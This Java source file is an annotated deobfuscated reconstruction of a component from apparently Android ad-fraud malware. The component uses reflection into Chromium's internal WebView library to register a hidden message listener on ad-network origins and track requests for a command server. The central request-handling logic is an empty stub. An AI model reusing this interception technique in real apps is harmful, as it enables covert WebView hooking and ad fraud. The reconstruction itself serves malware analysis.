package core;

import android.os.Build;
import android.webkit.WebView;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.AbstractCollection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Predicate;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * RequestFilter — WebView 请求拦截 / URL 过滤
 *
 * Original: IIIlIllIlI1.lIllIIIlIl1
 *
 * Intercepts WebView network requests using Chromium's internal API via reflection.
 * Registers a WebMessageListener that:
 *   1. Intercepts iframe and main-frame message events (i-req, i-arg, i-ans, m-req, m-ask, m-fin)
 *   2. Filters URLs by protocol (http/https only)
 *   3. Adds allowed ad-network origins (doubleclick.net, googlesyndication.com, syndicatedsearch.goog)
 *   4. Processes intercepted data through the malware's JS bridge
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │ Chromium Reflection Targets                                         │
 * ├──────────────────────────────────────────────────────────────────────┤
 * │ org.chromium.support_lib_glue.SupportLibReflectionUtil              │
 * │   → createWebViewProviderFactory()                                  │
 * │   → getFactory → createWebView → addWebMessageListener              │
 * │                                                                      │
 * │ Supported WebView features checked:                                  │
 * │   - WEB_MESSAGE_LISTENER                                             │
 * │   - WEB_MESSAGE_ARRAY_BUFFER                                         │
 * └──────────────────────────────────────────────────────────────────────┘
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │ Ad Network Origins (allowed in WebMessageListener rules)            │
 * ├──────────────────────────────────────────────────────────────────────┤
 * │ https://*.doubleclick.net                                            │
 * │ https://*.googlesyndication.com                                      │
 * │ https://syndicatedsearch.goog                                        │
 * └──────────────────────────────────────────────────────────────────────┘
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │ Message Protocol (JS ↔ Native bridge)                               │
 * ├──────────────────────────────────────────────────────────────────────┤
 * │ JSON keys: type, msg, id                                             │
 * │ Message types:                                                       │
 * │   i-req  → iframe request                                            │
 * │   i-arg  → iframe argument                                           │
 * │   i-ans  → iframe answer                                             │
 * │   m-req  → main request                                              │
 * │   m-ask  → main ask                                                  │
 * │   m-fin  → main finish                                               │
 * │   stop   → stop signal                                               │
 * └──────────────────────────────────────────────────────────────────────┘
 */
public class RequestFilter {

    // =========================================================================
    // Static String Constants (decrypted from XOR)
    // =========================================================================

    /** Log tag */
    public static final String LOG_TAG;                                 /* f24llllIIIIll1 */

    /** Chromium reflection class name */
    public static final String CHROMIUM_REFLECTION_CLASS;               /* f22lIIIIlllllIlll1 */

    /** Factory method name */
    public static final String FACTORY_METHOD;                          /* f25llllIllIl1 */

    // Message type constants
    public static final String MSG_TYPE_IFRAME_REQ;                     /* f21IllIIlIIII1 */
    public static final String MSG_TYPE_IFRAME_ARG;                     /* f20IlIlllIIlI1 */
    public static final String MSG_TYPE_IFRAME_ANS;                     /* f19IlIllIlllIllI1 */
    public static final String MSG_TYPE_MAIN_REQ;                       /* f26llllllIlIIIlll1 */
    public static final String MSG_TYPE_MAIN_ASK;                       /* f18IlIlIIlIII1 */
    public static final String MSG_TYPE_MAIN_FIN;                       /* f23lIllIIIlIl1 */

    static {
        LOG_TAG                 = "WebViewWebMessageUtils";
        CHROMIUM_REFLECTION_CLASS = "org.chromium.support_lib_glue.SupportLibReflectionUtil";
        FACTORY_METHOD          = "createWebViewProviderFactory";
        MSG_TYPE_IFRAME_REQ     = "i-req";
        MSG_TYPE_IFRAME_ARG     = "i-arg";
        MSG_TYPE_IFRAME_ANS     = "i-ans";
        MSG_TYPE_MAIN_REQ       = "m-req";
        MSG_TYPE_MAIN_ASK       = "m-ask";
        MSG_TYPE_MAIN_FIN       = "m-fin";
    }

    // =========================================================================
    // Inner: WebMessage InvocationHandler (JS bridge proxy)
    // =========================================================================

    /**
     * InvocationHandler that intercepts WebMessageListener.onPostMessage() calls.
     * When a message is received from a WebView iframe or main frame, it:
     *   1. Extracts the URL from the message
     *   2. Looks up the corresponding RequestInfo
     *   3. Generates a response via the malware's JS processing
     *   4. Posts the response back to the WebView
     *
     * Also handles Object method proxying (toString, hashCode, equals, getSupportedFeatures).
     *
     * Original: lIIIIlllllIlll1 (InvocationHandler)
     */
    public static class MessageListenerProxy implements InvocationHandler {

        /** Supported features to report */
        private final String[] supportedFeatures;                       /* f27llllIIIIll1 */

        public MessageListenerProxy(String[] features) {
            this.supportedFeatures = features;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            // Handle "onPostMessage" with 5 arguments
            if ("onPostMessage".equals(method.getName()) && args.length == 5) {
                try {
                    // args[1] = WebMessage, get the data field
                    Object webMessage = args[1].getClass().getFields()[0].get(args[1]);
                    String data = (String) webMessage.getClass()
                            .getMethod("getData", (Class<?>[]) null)
                            .invoke(webMessage, (Object[]) null);

                    if (data != null && !data.isEmpty()) {
                        Boolean isMainFrame = (Boolean) args[3];
                        RequestInfo requestInfo = RequestInfo.fromJson(data);
                        if (requestInfo == null) return null;

                        String response = processRequest(requestInfo, isMainFrame);
                        if (!response.isEmpty()) {
                            // args[4] = ReplyProxy, post response back
                            Object replyProxy = args[4].getClass().getFields()[0].get(args[4]);
                            replyProxy.getClass()
                                    .getMethod("postMessage", String.class)
                                    .invoke(replyProxy, response);
                        }
                    }
                    return null;
                } catch (Exception e) {
                    LogHelper.log(LogHelper.LogLevel.ERROR, LOG_TAG,
                            "onPostMessage handler error: " + e);
                }
            }

            // Handle standard Object methods
            String name = method.getName();
            if ("toString".equals(name)) {
                return "WebViewWebMessageListener@proxy";
            }
            if ("hashCode".equals(name)) {
                return System.identityHashCode(proxy);
            }
            if ("equals".equals(name)) {
                return proxy == args[0];
            }
            if ("getSupportedFeatures".equals(name)) {
                return new String[]{
                        "WEB_MESSAGE_LISTENER",
                        "WEB_MESSAGE_ARRAY_BUFFER"
                };
            }
            return null;
        }
    }

    // =========================================================================
    // Inner: Default Allowed Origins
    // =========================================================================

    /**
     * Default set of allowed ad-network origins for message interception.
     *
     * Original: llllIIIIll1 (extends HashSet<String>)
     */
    public static class DefaultAllowedOrigins extends HashSet<String> {
        public DefaultAllowedOrigins() {
            add("https://*.doubleclick.net");
            add("https://*.googlesyndication.com");
            add("https://syndicatedsearch.goog");
        }
    }

    // =========================================================================
    // Inner: RequestInfo (message data model)
    // =========================================================================

    /**
     * Represents a parsed message from the JS bridge.
     * JSON format: { "type": "...", "msg": "...", "id": "..." }
     *
     * Original: llllIllIl1.llllIIIIll1
     */
    public static class RequestInfo {
        /** Message content (typically JSON or URL) */
        public String message;      /* f35lIIIIlllllIlll1 — JSON key: "msg" */

        /** Message type (i-req, m-req, etc.) */
        public String type;         /* f36llllIIIIll1 — JSON key: "type" */

        /** Request ID for correlation */
        public String id;           /* f37llllIllIl1 — JSON key: "id" */

        /** Maximum number of request tracking entries */
        public static final Integer MAX_ENTRIES = 3000;                 /* f31lIIIIlllllIlll1 */

        /** Log tag for request tracking */
        public static final String TRACK_LOG_TAG = "stop";             /* f32llllIIIIll1 */

        /** Active offer ID */
        public static String currentOfferId = "";                       /* f33llllIllIl1 */

        /** Tracked request events (for reporting to C&C) */
        public static List<JSONObject> trackedEvents = new ArrayList<>(20);
                                                                        /* f30IllIIlIIII1 */
        /** Whether tracking is active */
        public static boolean isTracking = false;                       /* f29IlIlllIIlI1 */

        /** Map of URL → request status (0=pending, 1=loading, 2=done) */
        public static Map<String, Integer> requestStatusMap = new ConcurrentHashMap<>(25);
                                                                        /* f28IlIllIlllIllI1 */

        /** Map of URL → timestamp when status changed to "loading" */
        public static Map<String, Long> loadingTimestamps = new ConcurrentHashMap<>(25);
                                                                        /* f34llllllIlIIIlll1 */

        /**
         * Serializes this RequestInfo to JSON.
         */
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("type", this.type);
                json.put("msg", this.message);
                json.put("id", this.id != null ? this.id : "");
            } catch (JSONException unused) {
            }
            return json;
        }

        /**
         * Parses a RequestInfo from a JSON string.
         *
         * Original: llllIIIIll1(String str) [returns RequestInfo]
         */
        public static RequestInfo fromJson(String jsonStr) {
            if (jsonStr == null || jsonStr.isEmpty()) return null;
            try {
                JSONObject json = new JSONObject(jsonStr);
                RequestInfo info = new RequestInfo();
                info.type = json.get("type").toString();
                info.message = json.get("msg").toString();
                info.id = json.has("id") ? json.get("id").toString() : "";
                return info;
            } catch (Exception e) {
                LogHelper.log(LogHelper.LogLevel.WARN, LOG_TAG,
                        "Failed to parse RequestInfo JSON: " + e);
                return null;
            }
        }

        // ----- Request Status Tracking -----

        /**
         * Resets all tracking state.
         * Original: lIIIIlllllIlll1()
         */
        public static void resetTracking() {
            currentOfferId = "";
            trackedEvents.clear();
            isTracking = false;
            requestStatusMap.clear();
            loadingTimestamps.clear();
        }

        /**
         * Updates the status of a URL.
         * Original: llllIIIIll1(String str, Integer num)
         */
        public static void updateStatus(String url, Integer status) {
            requestStatusMap.put(url, status);
            if (status == 1) {
                loadingTimestamps.put(url, System.currentTimeMillis());
            }
            if (status == 2) {
                loadingTimestamps.remove(url);
            }
        }

        /**
         * Checks if a URL has a specific status.
         * Original: llllIIIIll1(String str, Integer... numArr)
         */
        public static boolean hasStatus(String url, Integer... statuses) {
            Integer current = requestStatusMap.getOrDefault(url, -1);
            for (Integer status : statuses) {
                if (Objects.equals(current, status)) return true;
            }
            return false;
        }

        /**
         * Checks if all tracked URLs are done or pending (not loading).
         * Original: llllIIIIll1() [returns boolean]
         */
        public static boolean allRequestsComplete() {
            return requestStatusMap.values().stream()
                    .filter(v -> v == 2 || v == 0)
                    .count() == requestStatusMap.size();
        }

        /**
         * Checks if any loading request has timed out (> MAX_ENTRIES ms).
         * Original: llllIllIl1() [returns boolean]
         */
        public static boolean hasTimedOutRequests() {
            long now = System.currentTimeMillis();
            for (Map.Entry<String, Integer> entry : requestStatusMap.entrySet()) {
                if (entry.getValue() == 1) {
                    Long startTime = loadingTimestamps.getOrDefault(entry.getKey(), 0L);
                    if (startTime > 0 && now - startTime > MAX_ENTRIES) {
                        return true;
                    }
                }
            }
            return false;
        }
    }

    // =========================================================================
    // WebView Feature Checks
    // =========================================================================

    /**
     * Checks if a specific WebView feature is supported.
     * Uses reflection on Chromium's internal support library.
     *
     * Original: IlIlllIIlI1()
     * @return true if "WEB_MESSAGE_LISTENER" is supported
     */
    public static boolean isWebMessageListenerSupported() {
        return Arrays.asList(getSupportedFeatures()).contains("WEB_MESSAGE_LISTENER");
    }

    /**
     * Gets the WebViewProvider via reflection.
     *
     * Original: IllIIlIIII1()
     * @return WebViewProvider instance
     */
    public static Object getWebViewProvider() {
        try {
            Method m = WebView.class.getDeclaredMethod("getFactory", (Class<?>[]) null);
            m.setAccessible(true);
            return m.invoke(null, (Object[]) null);
        } catch (IllegalAccessException | NoSuchMethodException | InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Gets the list of supported WebView features via Chromium reflection.
     *
     * Original: lIIIIlllllIlll1() [returns String[]]
     */
    public static String[] getSupportedFeatures() {
        String[] features = new String[0];
        try {
            InvocationHandler handler = getReflectionHandler();
            Object inner = handler.getClass().getFields()[0].get(handler);
            Object result = inner.getClass()
                    .getMethod("getSupportedFeatures", (Class<?>[]) null)
                    .invoke(inner, (Object[]) null);
            if (result instanceof String[]) {
                features = (String[]) result;
            }
            if (features.length == 0) {
                LogHelper.log(LogHelper.LogLevel.INFO, LOG_TAG,
                        "No supported WebView features found (empty array)");
            }
            return features;
        } catch (Throwable th) {
            LogHelper.log(LogHelper.LogLevel.WARN, LOG_TAG,
                    "Failed to get supported features: " + th);
            return features;
        }
    }

    /**
     * Gets the WebView class loader (API 28+ or via reflection).
     *
     * Original: llllIllIl1() [returns ClassLoader]
     */
    public static ClassLoader getWebViewClassLoader() {
        return Build.VERSION.SDK_INT >= 28
                ? WebView.getWebViewClassLoader()
                : getWebViewProvider().getClass().getClassLoader();
    }

    /**
     * Gets the Chromium SupportLibReflectionUtil handler.
     *
     * Original: llllIIIIll1() [returns InvocationHandler]
     */
    public static InvocationHandler getReflectionHandler()
            throws IllegalAccessException, InvocationTargetException,
            ClassNotFoundException, NoSuchMethodException {
        return (InvocationHandler) Class.forName(
                CHROMIUM_REFLECTION_CLASS, false, getWebViewClassLoader())
                .getDeclaredMethod(FACTORY_METHOD, (Class<?>[]) null)
                .invoke(null, (Object[]) null);
    }

    // =========================================================================
    // WebMessageListener Registration
    // =========================================================================

    /**
     * Registers a WebMessageListener on the WebView to intercept requests.
     *
     * Original: llllIIIIll1(WebView webView, Set<String> set, String str)
     *
     * @param webView the target WebView
     * @param origins additional allowed origins
     * @param targetUrl the URL to filter for
     */
    public static void registerMessageListener(WebView webView, Set<String> origins,
                                                String targetUrl) {
        LogHelper.debug(LOG_TAG,
                "Registering WebMessageListener for URL: " + targetUrl);
        try {
            String[] supportedFeatures = getSupportedFeatures();
            if (Arrays.asList(supportedFeatures).contains("WEB_MESSAGE_LISTENER")) {
                InvocationHandler handler = getReflectionHandler();
                Object inner = handler.getClass().getFields()[0].get(handler);

                // createWebView(webView)
                Object webViewWrapper = inner.getClass()
                        .getMethod("createWebView", WebView.class)
                        .invoke(inner, webView);

                // Get addWebMessageListener method
                Object listener = webViewWrapper.getClass().getFields()[0].get(webViewWrapper);
                Set<String> allOrigins = buildAllowedOrigins(origins, targetUrl);

                listener.getClass()
                        .getMethod("addWebMessageListener",
                                String.class, String[].class, InvocationHandler.class)
                        .invoke(listener,
                                "s2s1",
                                ((AbstractCollection<String>) allOrigins).toArray(new String[0]),
                                new MessageListenerProxy(supportedFeatures));
            }
        } catch (InvocationTargetException e) {
            LogHelper.debug(LOG_TAG,
                    "WebMessageListener registration failed (target): "
                    + e.getTargetException().getMessage());
        } catch (Throwable th) {
            LogHelper.error(LOG_TAG,
                    "WebMessageListener registration failed: " + th
                    + "\n" + th.getCause());
        }
    }

    // =========================================================================
    // URL / Origin Helpers
    // =========================================================================

    /**
     * Builds the complete set of allowed origins for the listener.
     *
     * Original: llllIIIIll1(Set<String> set, String str)
     */
    public static Set<String> buildAllowedOrigins(Set<String> extraOrigins, String targetUrl) {
        DefaultAllowedOrigins origins = new DefaultAllowedOrigins();
        if (!extraOrigins.isEmpty()) {
            origins.addAll(extraOrigins);
        }
        String origin = extractOrigin(targetUrl);
        if (!origin.isEmpty()) {
            origins.add(origin);
        }
        return origins;
    }

    /**
     * Extracts the origin (protocol + host + port) from a URL.
     *
     * Original: llllIIIIll1(String str) [returns String, URL parsing]
     * @param urlStr the URL to parse
     * @return origin string like "https://example.com" or "http://example.com:8080"
     */
    public static String extractOrigin(String urlStr) {
        try {
            URL url = new URL(urlStr);
            String protocol = url.getProtocol();
            if (!"http".equals(protocol) && !"https".equals(protocol)) {
                return "";
            }
            String portStr = url.getPort() > 0 ? ":" + url.getPort() : "";
            return protocol + "://" + url.getHost() + portStr;
        } catch (MalformedURLException e) {
            LogHelper.log(LogHelper.LogLevel.DEBUG, "",
                    "Malformed URL: " + urlStr + " - " + e.getMessage());
            return "";
        }
    }

    // =========================================================================
    // Request Processing (stub — actual logic is in decompiled bytecode dump)
    // =========================================================================

    /**
     * Processes an intercepted request and generates a response.
     *
     * Original: lIIIIlllllIlll1(RequestInfo, boolean)
     * Note: JADX failed to decompile this method (556 instructions).
     *       It processes message types (i-req, m-req, etc.) and generates
     *       appropriate JS responses.
     *
     * @param requestInfo the parsed request data
     * @param isMainFrame true if from the main frame
     * @return response string to post back
     */
    public static String processRequest(RequestInfo requestInfo, boolean isMainFrame) {
        // Original: 556 instructions, JADX decompilation failed
        // This method would dispatch based on requestInfo.type:
        //   i-req → handle iframe request
        //   m-req → handle main frame request
        //   i-arg → handle iframe argument
        //   i-ans → handle iframe answer
        //   m-ask → handle main frame ask
        //   m-fin → handle main frame finish
        //   stop  → handle stop signal
        return "";
    }

    // =========================================================================
    // Placeholder types
    // =========================================================================

    static class LogHelper {
        enum LogLevel { DEBUG, INFO, WARN, ERROR }
        static void log(LogLevel l, String t, String m) {}
        static void debug(String t, String m) {}
        static void error(String t, String m) {}
    }
}
